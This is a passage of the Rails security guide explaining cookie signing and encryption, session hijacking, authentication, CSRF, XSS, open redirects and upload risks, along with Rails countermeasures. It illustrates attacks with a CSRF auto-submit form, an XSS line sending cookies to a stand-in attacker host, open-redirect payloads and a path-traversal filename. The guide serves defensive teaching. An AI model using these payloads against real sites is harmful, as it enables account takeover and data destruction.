**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Securing Rails Applications
===========================

This guide describes common security problems in web applications and how to avoid them with Rails.

After reading this guide, you will know:

* How Rails secures data in cookies.
* The Rails Session and how it can be used as an attack vector.
* The security features implemented by the built-in authentication generator.
* Cross-Site Request Forgery (CSRF), Cross-Site Scripting (XSS) and similar attack strategies as well as the countermeasures Rails provides.
* How to safely store and deliver user-uploaded files.
* How to mask sensitive information from Rails logs.
* SQL injection and similar attack strategies and how to defend again them.
* HTTP security headers and browser-enforced security features.
* How to securely store secret credentials in Rails.

--------------------------------------------------------------------------------

Introduction
------------

Security is a key consideration in all web applications, and Rails
provides considerable countermeasures for common attack vectors right
out of the box. Even so, security must be evaluated throughout the
software development process as vulnerabilities enabling attacks
such as account hijacking, bypass of access control to sensitive
data, or the presentation of fraudulent content can be inadvertently
introduced despite Rails' built-in security features.

This guide will help you understand several attack strategies
and the countermeasures to defend against them using the
security features provided by Rails.

Cookies
-------

HTTP is a stateless protocol, meaning each request knows nothing
about the preceding request. [Cookies](https://en.wikipedia.org/wiki/HTTP_cookie)
provide a mechanism to add state to the HTTP protocol enabling
continuity between successive requests. Data such as the contents
of a shopping basket, or a user's preferences are often stored
in cookies.

Rails can create cookies with plain-text, signed, or encrypted
data. The `cookies` helper is available in Rails controllers
and provides key-value access to cookie data.

### Plain Text Cookies

Data within plain-text cookies can be viewed and modified
by users. Use this type of cookie very sparingly and cautiously
as they are not secure.

```ruby
# Create a plain text cookie.
cookies[:welcome_message_shown] = "true"
```

### Signed Cookies

Signed cookie data can be viewed by users, but is cryptographically
signed which means it cannot be tampered with. Use these cookies to
store information that is harmless for a user to view, but not
modify — for example, a user's preferences.

```ruby
# Create a signed cookie with a string value.
cookies.signed[:theme] = "dark"

# Create a signed cookie with a hash value.
cookies.signed[:preferences] = {
  value: {
    theme: "dark"
  }
}
```

This is what a signed cookie might look like:

```
eyJfcmFpbHMiOnsibWVzc2FnZSI6ImV5SjBhR1Z0WlNJNkltUmhjbXNpZlE9PSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLnByZWZlcmVuY2VzIn19--42055b1af0de2d69e083678793f9fbf25b57a752
```

It is made up of two parts separated by `--`. The first part is
the data itself in Base64 encoding. It can be decoded
using `Base64.strict_decode64`.

The second part is the cryptographic signature. This is calculated
using a key derived from your application's [`secret_key_base`][],
which is used to create a [`SHA1`](https://en.wikipedia.org/wiki/SHA-1)
digest of the cookie's data.

When Rails decodes the cookie data, it calculates the digest once
again and ensures it matches the value in the cookie string. This
means that signed cookies cannot be tampered with, as the two digests
will not match when the cookie data changes.

The algorithm used to calculate the digest can be changed using:

```ruby
# config/initializers/cookies.rb

Rails.app.config.action_dispatch.signed_cookie_digest = "SHA256"
```

The algorithm also takes another input known as a [_salt_][]. The
default value in this case is `signed cookie`, but you can change
it for added security:

```ruby
# config/initializers/cookies.rb

Rails.app.config.action_dispatch.signed_cookie_salt = "some other salt"
```

The signing logic is encapsulated by
[`ActiveSupport::MessageVerifier`](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html).
You can use this class to generate secure strings for other
use cases within your application. The signing key is generated
using [`ActiveSupport::KeyGenerator`][].

[`ActiveSupport::KeyGenerator`]: https://api.rubyonrails.org/classes/ActiveSupport/KeyGenerator.html

### Encrypted Cookies

Encrypted cookies offer another level of security above signed cookies.
The data is encrypted as well as signed so users cannot view or
modify the data without breaking encryption. Use encrypted cookies
to store sensitive user data such as a _remember token_ which
persists their signed-in state.

```ruby
# Creating a encrypted cookie with a string value.
cookies.encrypted[:remember_token] = "token"

# Creating a encrypted cookie with a hash value.
cookies.encrypted[:remember] = {
  value: {
    user_id: "id",
    token: "token"
  }
}
```

This is what an encrypted cookie looks like:

```
cH1pDGUPNNqmSXfAGFRA3ixa7MeR9XgSor+d1te+zdKeX/FR0RTK8YuEbK6Al1/d0uids3Yrg5PymBkYLpzmX0A0KaGB8MvbWtKNITe3RhzDPUXPWPzgrOCGRNGhB34rYLDYfQrafx0=--4MtlsRIS9FpejOvt--O7mLRmA/ylvCim91S5jyVA==
```

It's made up of 3 parts separated by `--`:

1. The encrypted cookie data in Base64 encoding.
2. The [initialization vector](https://en.wikipedia.org/wiki/Initialization_vector).
3. The authentication tag, which is equivalent to the _digest_ in signed cookies.

Cookies are encrypted with
[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
in [Galois/Counter Mode](https://en.wikipedia.org/wiki/Galois/Counter_Mode)
using a 256-bit key (`aes-256-gcm`). The encryption key is derived
from the application [`secret_key_base`][].

The encryption algorithm can be set to any
valid [`OpenSSL::Cipher`](https://www.rubydoc.info/stdlib/openssl/OpenSSL/Cipher)
algorithm:

```ruby
# config/initializers/cookies.rb

Rails.app.config.action_dispatch.encrypted_cookie_cipher = "aes-256-xts"
```

The [_salt_][] used to derive the encryption key is
`authenticated encrypted cookie`, but can be changed:

```ruby
# config/initializers/cookies.rb

Rails.app.config.action_dispatch.authenticated_encrypted_cookie_salt = "some other salt"
```

The encryption mechanism is provided by
[`ActiveSupport::MessageEncryptor`](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html).
You can use this class to create encrypted strings in
other parts of your application. The encryption key is
generated using [`ActiveSupport::KeyGenerator`][].

[`secret_key_base`]: https://api.rubyonrails.org/classes/Rails/Application.html#method-i-secret_key_base
[_salt_]: https://en.wikipedia.org/wiki/Salt_(cryptography)

### Rotating Encrypted and Signed Cookies

Rotation is a technique to gracefully upgrade the configuration
for signed and encrypted cookies without invalidating all existing
cookies.

WARNING: If your application's `secret_key_base` has been compromised,
strongly consider changing it as it means all strings secured
with `ActiveSupport::MessageVerifier` and `ActiveSupport::MessageEncryptor`,
including cookies, may now be broken. <br><br> Run `bin/rails secret`
to generate a new `secret_key_base`. <br><br> Changing the
`secret_key_base` means signed and encrypted cookies can no longer
be decoded. Active Storage files will also be affected as Rails
uses signed IDs within file URLs so they can be safely exposed
to the public. <br><br>DO NOT use rotation in this case, as rotation
will gracefully upgrade compromised cookies instead of invalidating
them.

Use `Rails.app.config.action_dispatch.cookies_rotations` after
changing the configuration of your cookies to add a rotation
with the old values.

```ruby
# config/initializers/cookies.rb

old_signed_cookie_key = # Regenerate old key
old_encrypted_cookie_key = # Regenerate old key

Rails.app.config.after_initialize do
  Rails.app.config.action_dispatch.cookies_rotations.tap do |cookies|
    cookies.rotate :signed, old_signed_cookie_key
    cookies.rotate :encrypted, old_encrypted_cookie_key
  end
end
```

Cookies secured with the old keys will now gracefully be upgraded
to the new key. You can rotate any option passed
to [`ActiveSupport::MessageVerifier.new`](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html#method-c-new-label-Options)
and [`ActiveSupport::MessageEncryptor.new`](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html#method-c-new-label-Options)

Here's an example to rotate the algorithm used to calculate the
digest of signed cookies:

```ruby
# config/initializers/cookies.rb

# Update the configuration setting for the digest
Rails.app.config.action_dispatch.signed_cookie_digest = "SHA256"

# Add a rotation to gracefully upgrade cookies signed with `SHA1`
Rails.app.config.after_initialize do
  Rails.app.config.action_dispatch.cookies_rotations.tap do |cookies|
    cookies.rotate :signed, digest: "SHA1"
  end
end
```

When you're confident all your active users' cookies have been
upgraded, you can remove the rotation.

### Configuring Cookies

Cookies offer a variety of
[configuration options](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Cookies) which
are used to secure and expire them. These options
can be set when creating cookies in a Rails controller:

```ruby
cookies["dark_mode"] = {
  value: "true",
  same_site: :lax,
  secure: true,
  http_only: true,
  expires: 1.year
}
```

See the [API docs](https://api.rubyonrails.org/v8.1.3/classes/ActionDispatch/Cookies.html) for all available usage options.

Sessions
--------

A Rails _session_ is a Ruby hash-like object holding data related to a
single user's session while interacting with the application.
User authentication data is usually held in the _session_ so the
user doesn't have to re-enter their credentials for every single
request. Rails also stores [_flash_](https://api.rubyonrails.org/classes/ActionDispatch/Flash.html) data in the session.

Rails creates a session object when the application is first
accessed from a browser. By default, the session data is stored
in an [encrypted cookie](#encrypted-cookies) which
[lives as long as the browser session](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#expiresdate).

NOTE: Read more about sessions and how to use them
in [Action Controller Overview Guide](action_controller_overview.html#session).

### Session Storage

The session is stored in a cookie by default, but alternative stores
such as an [Active Record store](https://github.com/rails/activerecord-session_store) are available. Some issues worth
considering when selecting your session store and the data
within it are:

* Cookies have a size limit of 4 kB.
* Cookies are stored on the client, which may preserve their contents
  even after the cookie has expired.
* Cookies are temporary by nature. The server can set expiration
  time for the cookie, but the client may delete the cookie and its
  contents before that.
* Session cookies do not invalidate themselves and can be maliciously reused.
  Ensure you have a mechanism to invalidate a session cookie.

Even when using other stores, an ID which references the data in
the session store needs to be stored in a cookie, so many security
concepts discussed in this section still apply.

### Session Hijacking

A common pattern for authentication in a web application is to store
the user's ID and a _token_ in a cookie after their email address and
password has been validated. In Rails, this information would be
stored in the _session_.

The ID and token is validated on each request and securely authenticates
the user. However, this means that the session serves as a _key_ to
the application, and a malicious user can hijack the session and
masquerade as a valid user.

In this section we'll look at approaches an attacker could use to
steal or otherwise take control of a user's session.

#### Cookie Sniffing

If a user accesses your application over an unencrypted connection,
on an insecure network (such as public Wi-Fi), a malicious user may
eavesdrop on the traffic and steal the session cookie.

Prevent this attack by ensuring your application is served over
HTTPS only. Use the below config option to set the
[HSTS header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security)
on HTTP responses which tells the client to communicate with
the host over HTTPS.

```ruby
# config/environments/production.rb

config.force_ssl = true
```

#### Session Replays

Once a malicious actor has a user's session cookie, they
can _replay_ it to the application to masquerade as that user.

[Cookie sniffing](#cookie-sniffing) is just one of many possible
methods in which an attack might acquire a valid user's session
cookie. Another possible scenario could be when a user hasn't logged
out of the application on a public computer, leaving their cookie
behind. Some browsers restore the session when they are re-opened so
this may give an unauthorized actor access to a valid user's cookie.

No matter how an attacker has acquired a user's cookie, once they
have it, it effectively gives them an _all-access pass_ to use the
application in the guise of a valid user.

To prevent this attack, always ensure that the data in a session
can be invalidated. Depending on the data stored in your session,
and the session store you're using, the exact method can vary.

When using a cookie store and storing authentication data in the
session, always include a _token_ which can be invalidated from the
server. This way, when an attacker tries to replay a session cookie
with an outdated token, authentication will fail.

Always consider this attack vector when storing other kinds of
data in the session or in cookies. For example, never use a
cookie to apply a discount for a user. They can save the cookie
and replay it to get that discount in perpetuity.

#### Session Fixation

When using a session store other than the cookie store, only the
_session ID_ is stored in a cookie. This is used to retrieve the
data from your chosen store on each request. This ID is stored
in plain-text, hence it can be viewed and modified by the user — meaning
that an attacker can use it to carry out a *session fixation* attack
whereby they inject a known _session id_ into a valid user's session
causing their private session data to be written to the compromised ID.

Here's how such an attack may be carried out:

1. The attacker creates a valid session ID by visiting your application's
log in page.
2. The attacker injects their session ID cookie into a user's browser. This
could be done using a variety of techniques such as [cross-site scripting (XSS)](#cross-site-scripting-xss),
or if they have access to the victim's machine, they may even make
the change in-person.
3. The user visits the application with the compromised session and logs in.
Authentication data is written to that ID.
4. The attacker can now use the session ID to masquerade as the victim.

Prevent this attack by resetting the session before storing sensitive
data, such as authentication information:

```ruby
class SessionsController < ApplicationController
  def create
    # create a new session ID
    reset_session

    # Log the user in ...
  end
end
```

After resetting the session, the attacker's session ID becomes useless.
The [Rails authentication generator](getting_started.html#adding-authentication) uses this approach.

#### Session Expiry and Invalidation

The longer a session lives, the more chances an attacker has to exploit
it. Expiring sessions after period of inactivity, as well as a mechanism
to invalidate sessions provides a backstop to reduce the risk of
session hijacking attacks.

Depending on your session store, and the implementation of your
application, the exact technique to do this will vary.

If you create database records for all active sessions (the Rails
authentication generator does this), you could periodically delete
session records older than a certain timeframe.

A session stored in a cookie is immune to a fixation attack, but may be
targeted with a replay attack. As such, your application should be able
to invalidate session cookies. This could be done by storing a token in
the session which is validated against a record in your database on
every request — deleting that record would invalidate the session.
Depending on your exact security requirements, the strategy will
vary, but the key aspect is that session cookies should never be
_permanent_.

User Management
---------------

This section discusses the techniques used to secure user accounts,
and potential attack vectors for malicius actors to take over control
of a user's account or escalate privileges without authorization.

### Authentication

An authentication system securely identifies the user of a web
application. It is the foundation for securing user data and is part
of most modern web applications.

Rails has an authentication generator built-in, which provides the base
for your authentication system. See the
[Getting Started](getting_started.html#adding-authentication) guide
and the [Sign Up and Settings](sign_up_and_settings.html) guide for
details on how to use the generator.

In this section, we'll focus on the security aspects of authentication.

### Secure Passwords

The `User` model created by the authentication generator
uses [bcrypt](https://github.com/bcrypt-ruby/bcrypt-ruby/) to
calculate a [secure hash](https://en.wikipedia.org/wiki/Cryptographic_hash_function)
of the password to store in the database. Storing the password in
plain-text is insecure as an attacker who has gained access to the
database or partial data within it could retrieve the password and
masquerade as a legitimate user.

The hashing process is computationally too expensive to reverse,
meaning the original password cannot be recovered from the hash.
The hashing algorithm is determininstic and hence will always produce
the same output for a given input. When a user attempts to log in,
we hash the supplied password and compare it to the hash in the database.

Rails abstracts this process with the
[`has_secure_password`](https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password)
method. This can be added to Active Record models to automate
the hashing of passwords and generate methods to securely
compare password hashes.

```ruby#2
class User < ApplicationRecord
  has_secure_password

  # ...
end
```

`has_secure_password` adds the following validations automatically:

* Password must be present.
* Password length should be less than or equal to 72 bytes.
* Optional confirmation of password (provided in the `password_confirmation` attribute).

It doesn't add validations for minimum length or password complexity.

```ruby
User.create(
  email: "user@example.com",
  password: "password123$",
  password_confirmation: "password123$"
)
```

#### Strong Passwords

Requiring a strong password during the sign up process can help
mitigate the effectiveness of brute-force or dictionary attacks.
The [National Institute of Standards and Technology (NIST)](https://pages.nist.gov/800-63-4/sp800-63b.html) has compiled a set of
password guidelines — summarized in [this article by 1password](https://1password.com/blog/nist-password-guidelines-update) — for web
application developers to enforce.

Implementing these guidelines offers your users a baseline level
of security against these attacks. You can also add an additional
layer by verifying whether a user's password has appeared in a
known data breach using the free
[Have I Been Pwned](https://haveibeenpwned.com)
API: https://haveibeenpwned.com/API/v3#PwnedPasswords

#### Securely Validating Password Hashes

Use [`authenticate_by`][] to retrieve and authenticate the user
using their password.

```ruby#3
class SessionsController < ApplicationController
  def create
    if user = User.authenticate_by(params.permit(:email_address, :password))
      # Authentication successful, log the user in
    else
      # Authentication failed
    end
  end
end
```

This method cryptographically digests the password regardless of
whether a `User` record is found. This mitigates
[timing-based enumeration attacks](https://en.wikipedia.org/wiki/Timing_attack)
using which an attacker could determine whether or not a `User`
exists in the system without knowing their password.

The `authenticate` instance method may also be used to validate
passwords, however this method is vulnerable to timing attacks:

```ruby
if user = User.find_by(email_address: email_address) &&
  user.authenticate(password)
  # ...
end
```

In the above example, the method will run marginally faster if a user
with the supplied email doesn't exist. This can be measured by attackers,
and hence we use [`authenticate_by`][] for added security.

[`authenticate_by`]: https://api.rubyonrails.org/classes/ActiveRecord/SecurePassword/ClassMethods.html

### Brute-Forcing Attacks

A [brute-force attack](https://en.wikipedia.org/wiki/Brute-force_attack)
uses trial-and-error to guess a user's credentials. An attacker may have
acquired a list of usernames and passwords through illicit means and use
that to attack your application. If any of the usernames and passwords
from that list match credentials in your application, the attacker can
take control of that account.

A [dictionary attack](https://en.wikipedia.org/wiki/Dictionary_attack) may
also be used to guess insecure passwords.

The automated tools which carry out such attacks vary in sophistication,
but there are some basic steps you can take to ensure you application
is protected. More advanced attacks may required specialist defenses.

#### Rate-limiting

A basic brute-force attack might be executed using a script running on
an attacker's machine. This can be mitigated using Rails' rate limiter:

```ruby
class SessionsController < ApplicationController
  rate_limit to: 10, within: 3.minutes, only: :create
end
```

The [`rate_limit`](https://api.rubyonrails.org/classes/ActionController/RateLimiting/ClassMethods.html#method-i-rate_limit) method counts requests
from a given remote IP and will raise an
`ActionController::TooManyRequests` error when the limit is exceeded.
Consult the [API docs](https://api.rubyonrails.org/classes/ActionController/RateLimiting/ClassMethods.html#method-i-rate_limit) for complete
usage information.

You can also use a [CAPTCHA](https://en.wikipedia.org/wiki/CAPTCHA) to
restrict access after a certain number of failed login attempts.

#### Generic Error Messages

Error messages displayed during sign up, log in, and password recovery
should be generic and not offer information about whether or not an
account exists. If an attacker can use the errors generated by your
application to deduce whether a given account exists, they may use
this technique to compile a list of accounts to use in a brute-force
attack.

Password recovery attempts for email address without an associated
account should fail silently and always show a generic success message.

The challenge is greater for a sign up page when handling duplicate
sign ups. Depending on your application's requirements your approach
may vary. You could always redirect a new sign up to a _success_ page
asking them to check their email for a confirmation link. In the case
of a duplicate sign up, your application could notify the actual user
via email of the duplicate sign up attempt.

#### Two-Factor Authentication

Using a second factor to authenticate a user adds an additional layer
of security protecting against brute-force attacks. Even if an attacker
has a valid password for a user, a secure second factor in addition
to the password will protect the user's account.

[Time-based one-time passwords](https://en.wikipedia.org/wiki/Time-based_one-time_password) are a secure way to implement
two-factor authentication.

Avoid using SMS-based one-time passwords as they are vulnerable
to physical theft. A thief can swap a user's SIM card into another
phone to receive SMS one-time passwords without ever breaking into
their phone.

Rails doesn't currently have built-in support for TOTP and hence
implementation details are out of scope for this guide.

#### Hardware Authenticators

For the highest level of security for your users, you can make use
of hardware authenticators as the second factor, or to enable
passwordless logins.

A hardware authenticator could be a USB device such as a
[YubiKey](https://en.wikipedia.org/wiki/YubiKey), or an authenticator
built into the user's device such as a fingerprint or facial scanner.

The [WebAuthn](https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API)
protocol standardizes this approach on the web platform.

### Account Hijacking

After an attacker has gained access to a user's account, they may
attempt to lock the user out of their own account. They may have used
one or more techniques discussed earlier in this guide to gain this
access — such as stealing a user's session cookie. For the purpose
of this discussion, the method of attack is not relevant, we assume
the attacker has access to an account and the countermeasures we can
use in this situation.

#### Passwords

An attacker may try to change the user's password to lock them out.
Always require the old password and validate that before updating
a password.

#### E-Mail

Changing the email address would effectively transfer ownership of
the account. Your defence against this might vary depending on
your application's account ownership model. One or more of the below
steps will help mitigate this attack:

* Require a password when changing the email address.
* Validate the change by sending an email to the existing email address.
* Send a notification to the previous email of the change, with
  instructions for recovery.

#### Reset Session

Finally, always ensure there is a way to lock an attacker out of
an account after they've gained access. Invalidating the data in
the attacker's session cookie will prevent them from using it again.

The exact method will depend on the specifics of your authentication
system. The best way to validate whether your defence works is to
test the attack in a controlled scenario and then apply your
countermeasures.

### Privilege Escalation

Whenever a user requests a resource, always ensure they are authorized
to access it. Consider the below controller and actions:

```ruby
class ProjectsController < ApplicationController
  # GET /projects
  def index
    @projects = Current.user.projects
  end

  # GET /projects/:id
  def show
    @project = Project.find(params[:id])
  end
end
```

The projects index may only direct the user to projects they have
access to, but there's nothing preventing them from manually
changing the `id` in the URL to view a project they shouldn't be
allowed to access. In this case, you could fix it by amending
the query to load a project:

```ruby
def show
  @project = Current.user.projects.find(params[:id])
end
```

More complex web applications will require a more elaborate authorization
layer with fine-grained access control. The key consideration is that
access to all resources should be controlled and handled on the server.
Never use JavaScript or front-end code for access control without
server validation as all user input and front-end code can be
manipulated.

Cross-Site Request Forgery (CSRF)
---------------------------------

To carry out a cross-site request forgery (CSRF) attack, a malicious
actor will lure a victim to an infected web page, potentially a
website that they control. That web page contains code which makes
requests to a different web application where the victim has an
active authenticated session, and hence can theoretically carry
out destructive operations disguised as a valid user.

Here's an example scenario:

1. Bob uses a project management application hosted at
  `https://projectmanagement-webapp.com`, and is currently signed in.
2. An attacker would like to compromise a project which Bob is working on,
  and sends him a
  [phishing email](https://en.wikipedia.org/wiki/Phishing) with a link
  to a malicious website.
3. Bob inadvertently clicks the link.
4. The malicious web page contains a form to delete a project, and a
  script to submit it when the page loads:

    ```html
    <form action="https://projectmanagement-webapp.com/projects/1" method="POST" id="delete-project">
      <input type="hidden" name="_method" value="delete">
    </form>
    <script>
      document.addEventListener("DOMContentLoaded", () => {
        document.getElementById("delete-project").requestSubmit()
      })
    </script>
    ```
5. The cookies will be sent along with the request. Since Bob is signed
  in, the the project will be deleted.

Both Rails, and the web platform itself have defences against this
kind of attack built-in. The next sections discuss some of these
measures as well as additional steps you can take within your
application to prevent CSRF vulnerabilities.

### `SameSite` Cookies

The [`SameSite` attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value)
can be defined in the `Set-Cookie` HTTP header to specify the contexts
in which the cookie should be transmitted. Rails session cookies are
set as `SameSite=Lax`, which is also the default value across browsers.

This means the cookie will only be sent with the HTTP request if
it originates on the same site, or the user follows a link to
your site.

Demonstrated practically, the session cookie will only be sent
with HTTP requests in the following scenarios:

_(we're assuming your Rails app is hosted at `https://myrailsapp.com`)_

* A user types in `https://myrailsapp.com` in their browser's address bar.
* A user clicks a link on a page hosted at `https://myrailsapp.com`.
* A user follows a link to `https://myrailsapp.com` from another external website.

The cookie WILL NOT be transmitted when a request originates on an
external website. For example, if an attacker tries to submit a
form `<form>`, or make a `fetch` request to `https://myrailsapp.com`
from their own website, the session cookie will not be sent along
with the request.

This prevents an attacker from taking advantage of a user's active
session in a web app to make unauthorised malicious requests when a
victim inadvertently visits their infected website.

Further information on the `SameSite` attribute is
[available here](https://web.dev/articles/samesite-cookies-explained).

Set the `SameSite` attribute on a cookie in a Rails controller using:

```ruby
cookies["dark_mode"] = {
  value: "true",
  same_site: :lax
}
```

### Rails' Authenticity Token

Rails offers application-level protection against CSRF attacks by
verifying a _CSRF token_ on all requests except `GET`.

A _CSRF token_ is securely generated and stored the session. This
token is used to generate an `authenticity_token` on each request.
The token is automatically inserted into forms via a hidden input.

```html
<input type="hidden" name="authenticity_token" value="Lb7wNkn7Ozyq9yc98VQuATDEvoPU3WBT8zzRIw8mBHZIUhANkM2DBJmdNCUtbNTaMrVzBrNttqFigrVFyEic6o" autocomplete="off">
```

Rails also renders `<meta>` tags containting the token in the
document's head by default.

```html+erb#6
<%# The default `app/views/layouts/application.html.erb` generated in a new Rails app %>

<!DOCTYPE html>
<html>
  <head>
    <%# ... %>
    <%= csrf_meta_tags %>
    <%# ... %>
  </head>
  <%# ... %>
</html>
```

`csrf_meta_tags` generates the following tags:

```html
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="..." />
```

`csrf-param` documents the `name` of the _hidden_ input for JavaScript
code which dynamically creates `FormData`, and `csrf-token` contains
the token itself which can be sent in a `X-CSRF-Token` HTTP header to
validate the request.

Rails compares this token with the one in the session to ensure the
request is valid.

Along with the `SameSite` cookie attribute, this defends agains
CSRF attacks because an attacker won't have access to the session
or CSRF token to authenticate their malicious requests.

INFO: Rails masks the authenticity token when injecting it into the
page, ensuring it's different for each request even though the
underlying CSRF token remains the same. See the
[`mask_token`](https://api.rubyonrails.org/classes/ActionController/RequestForgeryProtection.html#method-i-mask_token)
and [`unmask_token`](https://api.rubyonrails.org/classes/ActionController/RequestForgeryProtection.html#method-i-unmask_token) methods for
deeper insight into how this works.

This defence is enabled by default, but can be disabled using:

```ruby
# config/initializers/forgery_protection.rb

Rails.app.config.action_controller.default_protect_from_forgery = false
```

The behavior of this defence can be configured using:

```ruby
# config/initializers/forgery_protection.rb

# An exception is raised an exception when token verification fails
Rails.app.config.action_controller.default_protect_from_forgery_with :exception
```

The behavior can be changed for specific controllers
using [`protect_from_forgery`](https://api.rubyonrails.org/classes/ActionController/RequestForgeryProtection/ClassMethods.html#method-i-protect_from_forgery):

```ruby
class ApplicationController < ActionController::Base
  protect_from_forgery with: :reset_session
end
```

All options are available in the
[API docs](https://api.rubyonrails.org/classes/ActionController/RequestForgeryProtection/ClassMethods.html#method-i-protect_from_forgery).

#### Appropriate Use of HTTP methods

Rails doesn't verify the authenticity token for `GET`, `HEAD`,
and `QUERY` requests because they should **never** modify business
data. These HTTP methods requests should only be used for _reads_,
not _writes_.

A list of all HTTP methods and how they should be used can be [viewed on the MDN docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods).

Always use a non-`GET` verbs for endpoints which modify data in your application to benefit from Rails' CSRF protections.

Cross-Site Scripting (XSS)
--------------------------

A [cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting)
vulnerability would allow attackers to inject malicious client-side
scripts into a web page. An attacker can misuse any kind of user input
in a web application to attempt an XSS attack. Without proper
sanitization, inputs such as comments, message posts, search boxes etc.
can all serve as entry points to XSS attacks.

Here's an example XSS attack scenario:

1. An attacker visits a public message board and creates a post
  including hidden malicious JavaSript code.
2. The web application doesn't sanitize the contents of the post
  and saves it.
3. A victim views the page and the malicious JavaScript executes
  on their machine.

The malicious code may steal cookies, hijack the session, redirect
the victim to a phising website, display advertisements for the
benefit of the attacker, change elements on the website to get
confidential information, or install malicious software through
vulnerabilites in the web browser. The scope of misuse is endless.

### Sanitizing User Input

The most common entry point for an XSS attack is injecting HTML,
CSS, or JavaScript into a web page. Prevent this by sanitizing
all user input to ensure it's safe.

Rails uses the [`rails-html-sanitizer`](https://github.com/rails/rails-html-sanitizer)
gem to parse and sanitize HTML and CSS input — only allowing a set of
safe tags. The [`ActionView::Helpers::SanitizeHelper`](https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html)
provides a number of methods which invoke `rails-html-sanitizer`
under the hood to simplify sanitization in your HTML template.

You can safely render user input in an HTML template using:

```erb
<%= sanitize @comment.body %>
```

This will strip any unsafe tags to prevent XSS attacks. Other helpers
available are: [`sanitize_css`][], [`strip_links`][], and [`strip_tags`][].
See the [API docs](https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html)
for complete usage information.

[`sanitize_css`]: https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize_css
[`strip_links`]: https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-strip_links
[`strip_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-strip_tags

Action Text automatically uses a sanitizer on both [content](https://api.rubyonrails.org/classes/ActionText/ContentHelper.html#method-i-sanitize_action_text_content)
and [attachments](https://api.rubyonrails.org/classes/ActionText/ContentHelper.html#method-i-sanitize_content_attachment).

### Escaping Output

As an alternative to sanitizing user input, you can also _escape_
strings before rendering them to HTML to prevent XSS code execution.
Escaping a string replaces HTML characters like `<` and `>` with
their uninterpreted representations: `&lt;`, `&gt;` etc.

This can be useful when you need to safely render HTML as-is in the
page rather than execute it.

```html+erb
<%= html_escape @snippet.contents %>
<%# or %>
<%= h @snippet.contents %>
```

### Cookie Theft

An XSS attack could target a site's cookies. Cookies can only be read
from the same domain so an attacker cannot lure a victim to their
website to read cookies from a completely different website. Since
an XSS attack relies on injecting code into another site, it could
be used to steal a user's cookies.

The below injection makes a request to the attacker's website with
all of a user's cookies. They can then inspect their logs to retrieve
the cookie and use it to perform a variety to attacks to take control
of the user's account.

```html
<script>document.write('<img src="https://steal-a-cookie.com/' + document.cookie + '">');</script>
```

Use the [`HttpOnly` attribute](https://owasp.org/www-community/HttpOnly)
on the `Set-Cookie` header to prevent a cookie from being access
using JavaScript. Such cookies will only be sent with HTTP requests
(including `fetch` and AJAX), but cannot be read using `document.cookie`.

Rails session cookies are `HttpOnly` by default. Create an `HttpOnly`
cookie in a Rails controller using:

```ruby
cookies["dark_mode"] = {
  value: "true",
  http_only: true
}
```

### Content Security Policy

A [`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) HTTP response header can be defined to explicitly
allowlist the sources for JavaScript and other external content.

This prevents XSS attacks as the browser will only execute code from
verified sources. See the [Content Security Policy](#content-security-policy-header) section for
further details.

Open Redirects
--------------

Redirecting users can be a vulnerability when user input is injected
into the destination URL. For example, consider the below action which
redirects a user to another path supplied in a URL parameter:

```ruby
# GET /comments
def show
  if params[:comment_path]
    redirect_to params[:comment_path]
  end
end
```

The legitimate use case for the above action is to send the user to a
specific comment:

```
/comments?comment_path=/comment/42
```

An attacker can misuse the parameter to inject their own malicious
page to which the user will be redirected.

```
/comments?comment_path=https://evil.site
```

Even worse, the attacker could redirect to a [data URL](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/data)
which will directly display its contents in the browser. The below
example shows a redirect to a Base64 encoded script which displays
an alert:

```
/comments?comment_path=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
```

The browser will execute the script and display an alert to the
user. This example is harmless but this technique could be used to
display a phishing page, download a file onto the user's machine,
or any number of other malicious actions.

You may choose to use the HTTP `Referer` header to redirect the user
back to where they came from:

```ruby
redirect_to request.headers[:referer]
```

This technique is also vulnerable to an open redirect attack becase
the `Referer` header can be easily spoofed as HTTP is a plain-text
protocol.

Rails prevents these attacks by only allowing redirects to paths
on the same domain. A redirect to a data URL, or an external URL
will raise an exception. These redirects can be enabled with
the `allow_other_host` option:

```ruby
redirect_to "https://some-other.site", allow_other_host: true
```

Use `allow_other_host` cautiously, and avoid injecting user
input into the destination URL when using this technique. If
you must include user input, sanitize it to ensure it's an
expected value. Enabling `allow_other_host` will create an
open redirect vulnerability without the proper care.

User Uploaded Files
-------------------

File uploads can offer attackers a way into your server, or
the ability to manipulate files on your server. Rails
includes [Active Storage](https://guides.rubyonrails.org/active_storage_overview.html) which manages file uploads and
will protect you from the attacks described in this section.
However, these techniques are worth bearing in mind as you
build file uploads into your application.

### File Names

An attacker can craft a filename which includes a relative path
to overwrite an important file on your server. If your application
stores uploaded files at `/var/www/uploads`, the attacker might
try to upload a file with the name `../../../etc/passwd` to overwrite
a file in a completely different location.

This is a contrived example — your server permissions are
unlikely to allow such an operation. However, the theory still
